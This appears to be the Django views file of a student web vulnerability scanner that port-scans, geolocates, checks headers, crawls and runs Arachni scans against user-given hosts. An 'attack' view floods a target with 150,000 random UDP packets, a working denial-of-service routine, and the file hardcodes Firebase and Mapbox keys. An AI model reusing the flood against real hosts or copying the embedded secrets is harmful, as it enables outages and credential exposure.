from django.shortcuts import render, render_to_response
from subprocess import run,PIPE
import requests
import sys
from django.views.decorators.csrf import csrf_exempt
from django.template import RequestContext
from django.http import HttpResponse
import socket
import subprocess
import os
from collections import OrderedDict
import urllib
import json
import random
import time
import mechanize
import http.cookiejar as cookielib
from bs4 import BeautifulSoup
import html2text
import requests 
import lxml.html
from django.contrib.auth.decorators import login_required
from .headercheck import SecurityHeaders
from myapp.securityheaders.__main__ import cli
from myapp.arachni_tester import ArachniClient
from urllib.parse import urlparse
import urllib.request
from django.shortcuts import render, redirect
from django.contrib.auth import (
    authenticate,
    get_user_model,
    login,
    logout
)
from .forms import UserLoginForm, UserRegisterForm
import pyrebase 


config={
    "apiKey": "AIzaSyARTOEGZOikzGrk6f0jSkhCiXBx2FAKg78",
    "authDomain": "fyptheboyes.firebaseapp.com",
    "databaseURL": "https://fyptheboyes.firebaseio.com",
    "projectId": "fyptheboyes",
    "storageBucket": "fyptheboyes.appspot.com",
    "messagingSenderId": "1073113067983",
    "appId": "1:1073113067983:web:7564efc27471e46f65e2ba",
    "measurementId": "G-R0SJYKDBMZ"

}
firebase=pyrebase.initialize_app(config)
db=firebase.database()
#https://www.youtube.com/watch?v=gsW5gYTNi34



def error_404_view(request,exception):
    return render_to_response('404.html')

def error_505_view(request,exception):
    return render_to_response('500.html')

def login_view(request):
    next = request.GET.get('next')
    form = UserLoginForm(request.POST or None)
    if form.is_valid():
        username = form.cleaned_data.get('username')
        password = form.cleaned_data.get('password')
        user = authenticate(username=username, password=password)
        login(request, user)
        if next:
            return redirect(next)
        return redirect('/select')

    context = {
        'form': form,
    }
    return render(request, "login.html", context)


def register_view(request):
    next = request.GET.get('next')
    form = UserRegisterForm(request.POST or None)
    if form.is_valid():
        user = form.save(commit=False)
        password = form.cleaned_data.get('password')
        user.set_password(password)
        user.save()
        new_user = authenticate(username=user.username, password=password)
        login(request, new_user)
        if next:
            return redirect(next)
        return redirect('/')

    context = {
        'form': form,
    }
    return render(request, "signup.html", context)


def logout_view(request):
    logout(request)
    return redirect('/')

@login_required
def pick(request):
    return render_to_response('pick.html')

@login_required
def normal(request):
    return render_to_response('normal.html')    

@login_required
def fullscan_arachni(request):
    return render_to_response('fullarachni.html') 

@login_required
def index(request):
    return render_to_response('index.html')

@login_required
@csrf_exempt
def external(request):

    remoteServer    = request.POST.get('param')
    remoteServerIP  = socket.gethostbyname(remoteServer)
    com_port = [20, 21, 22, 23, 25, 50, 51, 53, 67, 68, 69, 80, 110, 119, 123, 135,136, 137, 138, 139, 143, 161, 162, 179, 389, 443, 636, 989, 990, 993, 1812]
    portOpenList = []
    portCloseList = []
    #out=run([sys.executable, 'D://Desktop//quanta//QuantaDjango//quanta_Scanner//mysite//myapp//tester.py',inp], shell=False)
    try:
        for port in com_port:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.8)
            result = sock.connect_ex((remoteServerIP, port))
            if result == 0:
                portOpenList.append(port)
                print("Port {}: 	 Open".format(port))

            else:
                portCloseList.append(port)
                print("Port {}:          Closed".format(port))
            sock.close()

    except KeyboardInterrupt:
        print("Keyboard Interrupt")
    fixed_list=str(portOpenList)[1:-1]
 
    print ("ip: ",remoteServer , "portsOpen: ", fixed_list)
    
    ip_locate=urllib.request.urlopen("http://ip-api.com/json/"+remoteServer)
    data=ip_locate.read()
    values=json.loads(data)
    val=values['lat']
    val2=values['lon']


    b=len(fixed_list)/31
    c=b*100
    #----------------------------------------------
    
    foo = SecurityHeaders()

    parsed = urlparse(remoteServer)
    if not parsed.scheme:
        url = 'https://' + remoteServer # default to http if scheme not provided


    headers = foo.check_headers(url)

    if not headers:
        print ("Failed to fetch headers, exiting...")
        sys.exit(1)

    okColor = '\033[92m'
    warnColor = '\033[93m'
    endColor = '\033[0m'
    
    for header, value in headers.items():
        if value['warn'] == 1:
            if value['defined'] == False:
                print('Header \'' + header + '\' is missing ... [ ' + warnColor + 'WARN' + endColor + ' ]')
            else:
                print('Header \'' + header + '\' contains value \'' + value['contents'] + '\'' + \
                    ' ... [ ' + warnColor + 'WARN' + endColor + ' ]')
        elif value['warn'] == 0:
            if value['defined'] == False:
                print('Header \'' + header + '\' is missing ... [ ' + okColor + 'OK' + endColor +' ]')
            else:
                print('Header \'' + header + '\' contains value \'' + value['contents'] + '\'' + \
                    ' ... [ ' + okColor + 'OK' + endColor + ' ]')

    https = foo.test_https(url)
    if https['supported']:
        print('HTTPS supported ... [ ' + okColor + 'OK' + endColor + ' ]')
    else:
        print('HTTPS supported ... [ ' + warnColor + 'FAIL' + endColor + ' ]')

    if https['certvalid']:
        print('HTTPS valid certificate ... [ ' + okColor + 'OK' + endColor + ' ]')
    else:
        print('HTTPS valid certificate ... [ ' + warnColor + 'FAIL' + endColor + ' ]')


    if foo.test_http_to_https(url, 5):
        print('HTTP -> HTTPS redirect ... [ ' + okColor + 'OK' + endColor + ' ]')
    else:
        print('HTTP -> HTTPS redirect ... [ ' + warnColor + 'FAIL' + endColor + ' ]')
    # -------------------------------------------
    cli(url)
    
    # urlscraper(url)
                            
    visited_links  = set()
    # Cookie Jar

    cj=cookielib.LWPCookieJar()
    def visit(br, url):
        br.open(url)
        br._factory.is_html = True
        links = br.links()
        for link in links:
            if not link.url in links:
                visited_links.add(link.url)  

    br = mechanize.Browser()
    cj = cookielib.LWPCookieJar()
    br.set_cookiejar(cj)
    
    br.set_handle_equiv(True)
    br.set_handle_gzip(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    #br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
    thelink='https://'+remoteServer
    br.open(thelink)
    
    # Select the second (index one) form (the first form is a search query box)
    for f in br.forms():
        print (f)

    br.select_form(nr=0)

    # User credentials
    br.form['email'] = request.POST.get('userInp')
    br.form['password'] = request.POST.get('passInp')
    
    br.submit()
    
    br.set_cookiejar(cj)
    print(cj)

    visit(br,thelink)
    bar=visited_links.copy()
    for e in bar:
        visit(br,e)
    
    print(list(visited_links))
    
        # -------------------------------------------------------------------
    a=render(request, 'index.html',{'data':fixed_list,'data2':c,'data3':val,'data4':val2, 'data5':list(visited_links), 'data6':cj})
    
    #sending to firebase
    to_firebase={"ip":remoteServer,"port_open":fixed_list, "ip_info":values, "links_found":list(visited_links),"head_found":headers}
    db.child(remoteServer.replace(".","_")).set(to_firebase)
    
    return a
    #BRUTE FORCE


@login_required
@csrf_exempt
def norm_scan(request):

    remoteServer    = request.POST.get('param')
    remoteServerIP  = socket.gethostbyname(remoteServer)
    com_port = [20, 21, 22, 23, 25, 50, 51, 53, 67, 68, 69, 80, 110, 119, 123, 135,136, 137, 138, 139, 143, 161, 162, 179, 389, 443, 636, 989, 990, 993, 1812]
    portOpenList = []
    portCloseList = []
    #out=run([sys.executable, 'D://Desktop//quanta//QuantaDjango//quanta_Scanner//mysite//myapp//tester.py',inp], shell=False)
    try:
        for port in com_port:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.8)
            result = sock.connect_ex((remoteServerIP, port))
            if result == 0:
                portOpenList.append(port)
                print("Port {}: 	 Open".format(port))

            else:
                portCloseList.append(port)
                print("Port {}:          Closed".format(port))
            sock.close()

    except KeyboardInterrupt:
        print("Keyboard Interrupt")
    fixed_list=str(portOpenList)[1:-1]
 
    print ("ip: ",remoteServer , "portsOpen: ", fixed_list)
    
    ip_locate=urllib.request.urlopen("http://ip-api.com/json/"+remoteServer)
    data=ip_locate.read()
    values=json.loads(data)
    val=values['lat']
    val2=values['lon']


    b=len(fixed_list)/31
    c=b*100
    #----------------------------------------------
    
    foo = SecurityHeaders()

    parsed = urlparse(remoteServer)
    if not parsed.scheme:
        url = 'https://' + remoteServer # default to http if scheme not provided


    headers = foo.check_headers(url)

    if not headers:
        print ("Failed to fetch headers, exiting...")
        sys.exit(1)

    okColor = '\033[92m'
    warnColor = '\033[93m'
    endColor = '\033[0m'
    
    for header, value in headers.items():
        if value['warn'] == 1:
            if value['defined'] == False:
                print('Header \'' + header + '\' is missing ... [ ' + warnColor + 'WARN' + endColor + ' ]')
            else:
                print('Header \'' + header + '\' contains value \'' + value['contents'] + '\'' + \
                    ' ... [ ' + warnColor + 'WARN' + endColor + ' ]')
        elif value['warn'] == 0:
            if value['defined'] == False:
                print('Header \'' + header + '\' is missing ... [ ' + okColor + 'OK' + endColor +' ]')
            else:
                print('Header \'' + header + '\' contains value \'' + value['contents'] + '\'' + \
                    ' ... [ ' + okColor + 'OK' + endColor + ' ]')

    https = foo.test_https(url)
    if https['supported']:
        print('HTTPS supported ... [ ' + okColor + 'OK' + endColor + ' ]')
    else:
        print('HTTPS supported ... [ ' + warnColor + 'FAIL' + endColor + ' ]')

    if https['certvalid']:
        print('HTTPS valid certificate ... [ ' + okColor + 'OK' + endColor + ' ]')
    else:
        print('HTTPS valid certificate ... [ ' + warnColor + 'FAIL' + endColor + ' ]')


    if foo.test_http_to_https(url, 5):
        print('HTTP -> HTTPS redirect ... [ ' + okColor + 'OK' + endColor + ' ]')
    else:
        print('HTTP -> HTTPS redirect ... [ ' + warnColor + 'FAIL' + endColor + ' ]')
    # -------------------------------------------
    cli(url)
    
    # urlscraper(url)
                            
    visited_links  = set()
    # Cookie Jar

    cj=cookielib.LWPCookieJar()
    def visit(br, url):
        br.open(url)
        br._factory.is_html = True
        links = br.links()
        for link in links:
            if not link.url in links:
                visited_links.add(link.url)  

    br = mechanize.Browser()
    cj = cookielib.LWPCookieJar()
    br.set_cookiejar(cj)
    
    br.set_handle_equiv(True)
    br.set_handle_gzip(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    #br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
    thelink='https://'+remoteServer
    br.open(thelink)
    
    # Select the second (index one) form (the first form is a search query box)
    
    br.set_cookiejar(cj)
    print(cj)

    visit(br,thelink)
    bar=visited_links.copy()
    for e in bar:
        visit(br,e)
    
    print(list(visited_links))
    
        # -------------------------------------------------------------------
    a=render(request, 'index.html',{'data':fixed_list,'data2':c,'data3':val,'data4':val2, 'data5':list(visited_links), 'data6':cj})
    
    #sending to firebase
    to_firebase={"ip":remoteServer,"port_open":fixed_list, "ip_info":values, "links_found":list(visited_links),"head_found":headers}
    db.child(remoteServer.replace(".","_")).set(to_firebase)
    
    return a
    #BRUTE FORCE
    
@login_required
@csrf_exempt    
def arachni (request):
    a = ArachniClient()
    resumeFlag = False
    authFlag = False

    #checks for existing scans and resumes from there instead
    avail_scan_object = a.get_scans() #returns json object of available scans
    print(a.get_scans()) #displays available scans | testing only

    for x in avail_scan_object: #check if avail scan is ongoing
        status_object = a.get_status(x)
        if(status_object["busy"] == True): #break and resume last scan if scan is still ongoing
            scan_ID = x
            resumeFlag = True
            start_time = time.time()
            break

    print("Normal scan")
    url = request.POST.get('param')
    a.target(url)
    scan_json_object = a.start_scan() #outputs json dictionary
    scan_ID = scan_json_object["id"]
    start_time = time.time()


    while True:
    
        print("Resumed scan? | ", resumeFlag)
        print("Authenticated? | ", authFlag)
        print("The scan is ongoing...")
        status_object = a.get_status(scan_ID)

        print("Current page is: ", status_object["statistics"]["current_page"])
        print("Total audited pages are: ", status_object["statistics"]["audited_pages"])
        print("Total found pages are: ", status_object["statistics"]["found_pages"])
        print("Elapsed time is: ", status_object["statistics"]["runtime"])
        print("Current status is: ", status_object["status"])
        print("Current busy flag is: ", status_object["busy"])

        if(status_object["busy"] == False):
            print("Total scan time: ", status_object["statistics"]["runtime"])
            print("Scan has been completed, retrieving report...")
            a.getScanReport(scan_ID,"json") #output to json for database processing
            a.getScanReport(scan_ID,"html") #output to html for user ease of interaction
            a.processJSON(scan_ID) #print out choice information
            break
        time.sleep(60) #delay status update to 1 minute per status request
        
    a.delete_scan(scan_ID) #comment this out if performing testing | deletes the scan after it is complete to prevent zombie processes
    
    return render(request, 'fullarachni.html')

def default_map(request):
    mapbox_access_token = 'pk.eyJ1IjoibWFzdGVyZWxhaGVlIiwiYSI6ImNrOWp0am43MTFtM3IzbHA0dzhuOHZiN3UifQ.kgIXiMoyl9tfKZcFys9b_Q'
    return render(request, 'default.html', {'mapbox_access_token': mapbox_access_token})


def attack(request):
    remoteServer2    = request.POST.get('param2')
    remoteServerIP2  = socket.gethostbyname(remoteServer2)
    sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    bytes = random._urandom(1490)
    sent = 0
    port=80
    while sent<150000:
        sock2.sendto(bytes, (remoteServerIP2,port))
        sent = sent + 1
        port = port + 1
        print ("Sent %s packet to %s throught port:%s"%(sent,remoteServerIP2,port))
        if port == 65534:
            port = 1
    return render_to_response('index.html')




# def urlscraper(url):
       
    
#    # Browser

#     links  = set()                             
#     visited_links  = set()
#     # Cookie Jar

#     cj=cookielib.LWPCookieJar()

#     # Browser options

#     # The site we will navigate into, handling it's session
    
                
                
                

#     # urlList = []
#     # getpage= requests.get('http://f27ad1ed2e47.ngrok.io/admin')

#     # getpage_soup= BeautifulSoup(getpage.text, 'html.parser')

#     # all_links= getpage_soup.findAll('a', href=True)
#     # print(all_links)





#     if __name__ == '__main__':
#         #-----------------------------------------------------------------------------------
        
        
     
#         br = mechanize.Browser()
#         cj = cookielib.LWPCookieJar()
#         br.set_cookiejar(cj)
        
#         br.set_handle_equiv(True)
#         br.set_handle_gzip(True)
#         br.set_handle_redirect(True)
#         br.set_handle_referer(True)
#         br.set_handle_robots(False)
#         #br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
#         br.addheaders = [('User-agent','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/45.0.2454101')]
        
#         br.open(url)

#         # Select the second (index one) form (the first form is a search query box)
        
#         br.select_form(nr=0)

#         # User credentials
#         br.form['email'] = 'admin@admin.com'
#         br.form['password'] = 'password'
#         br.submit()
        
#         br.set_cookiejar(cj)
#         print(cj)
#         # br.addheaders=[('Cookie',cj)]
        

        
#         visit(br,url)
#         bar=visited_links.copy()
#         for e in bar:
            
#             visit(br,e)
#         print(list(visited_links))
#         legit=list(visited_links)
#         return legit